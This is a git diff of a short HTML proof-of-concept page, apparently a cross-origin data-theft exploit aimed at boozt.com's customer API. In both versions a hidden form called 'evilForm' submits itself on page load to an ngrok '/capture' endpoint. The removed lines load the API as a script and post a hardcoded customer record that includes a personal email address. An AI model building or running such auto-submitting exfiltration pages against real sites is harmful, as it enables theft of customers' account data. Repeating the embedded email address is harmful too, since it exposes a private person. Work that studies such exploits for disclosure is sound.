@@ -1,23 +1,11 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <form id="evilForm" method="POST" action="https://6574-2804-4580-1080-7db-f323-d027-7f53-d143.ngrok-free.app/capture">
-        <input type="hidden" name="data">
+    <form id="evilForm" method="POST" action="https://838d-2804-4580-1080-7db-f050-2160-a7bd-b583.ngrok-free.app/capture">
+        <input type="hidden" name="target" value="https://www.boozt.com/at/de-at/api/customer">
     </form>
     <script>
-        // Carregar os dados como uma "fonte" pra evitar CORS
-        const script = document.createElement('script');
-        script.src = "https://www.boozt.com/at/de-at/api/customer";
-        document.body.appendChild(script);
-
-        // Quando o script carregar (ou falhar), enviar pro Ngrok
-        script.onload = script.onerror = function() {
-            // Na prática, o atacante pegaria os dados manualmente aqui
-            // Pra PoC, vamos simular com o que já sabemos que aparece
-            const fakeData = '{"id":14015764,"username":"nanndagomes1821@gmail.com","billing_firstname":"Oii",...}'; // Substitua por dados reais se conseguir capturar
-            document.querySelector("input[name=data]").value = fakeData;
-            document.getElementById("evilForm").submit();
-        };
+        document.getElementById("evilForm").submit();
     </script>
 </body>
 </html>
